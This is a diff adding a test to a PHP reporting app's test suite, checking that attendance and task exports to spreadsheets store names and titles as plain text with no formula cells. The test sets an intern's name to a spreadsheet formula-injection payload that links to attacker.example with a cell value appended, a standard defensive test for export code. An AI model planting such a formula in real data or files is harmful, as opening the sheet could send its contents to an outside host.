@@ -170,6 +170,24 @@ describe('rekap task', function () {
     });
 });
 
+it('writes names and task titles as text, never as spreadsheet formulas', function () {
+    $payload = '=HYPERLINK("https://attacker.example/?d="&A9,"Rina Wulandari")';
+    $this->rina->update(['name' => $payload]);
+    Task::factory()->for($this->rina, 'intern')->create(['mentor_id' => $this->sari->id, 'title' => '=1+1', 'due_at' => '2026-10-05 17:00:00']);
+
+    foreach (['attendance', 'tasks'] as $type) {
+        $response = exportReport($this->admin, ['type' => $type, 'from' => '2026-10-01', 'to' => '2026-10-09'])->assertOk();
+
+        $zip = new ZipArchive;
+        $zip->open($response->baseResponse->getFile()->getPathname());
+        $sheet = (string) $zip->getFromName('xl/worksheets/sheet1.xml');
+        $zip->close();
+
+        expect($sheet)->not->toContain('<f>')
+            ->and(array_merge(...xlsxRows($response)))->toContain($payload);
+    }
+});
+
 it('validates the report form', function (array $data, string $field, string $message) {
     exportReport($this->admin, ['type' => 'attendance', 'from' => '2026-10-01', 'to' => '2026-10-09', ...$data])
         ->assertUnprocessable()
